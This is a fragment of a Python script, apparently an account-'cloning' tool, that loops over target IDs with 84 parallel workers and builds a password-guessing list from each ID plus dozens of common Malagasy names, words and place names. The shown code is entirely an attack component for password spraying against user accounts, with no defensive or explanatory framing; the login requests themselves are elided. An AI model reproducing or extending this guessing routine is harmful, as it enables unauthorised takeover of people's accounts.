...
def BD_CLONING():
    ...
    with tred(max_workers=84) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nekena','Nekena','fitiavana','Fitiavana','nirina','Nirina','fanantenana','Fanantenana','malagasy','Malagasy','anjara','Anjara','malala','Malala','vadiko','Vadiko','mamako','Mamako','jesosy','Jesosy','milely','Milely','ravaka','Ravaka','sarindra','narindra','fanomezana','fiderana','Fiderana','fandresena','Fandresena','nantenaina','Nantenaina','Rakotomalala','rakotomalala','fahendrena','Fahendrena','finoana','Finoana','amboara','Amboara','nomena','Nomena','Fanomezana','faneva','Faneva','valisoa','Valisoa','malalako','Malalako','narovana','Narovana','mamiko','Mamiko','tantely','Tantely','tolotra','Tolotra','fifaliana','Fifaliana','safidy','Safidy','mahefa','Mahefa','solofo','Solofo','randria','Randria','mahery','Mahery','tsilavina','Tsilavina','maminirina','Maminirina','fanomezantsoa','Fanomezantsoa','diamondra','Diamondra','mandresy','Mandresy','antananarivo','Antananarivo']
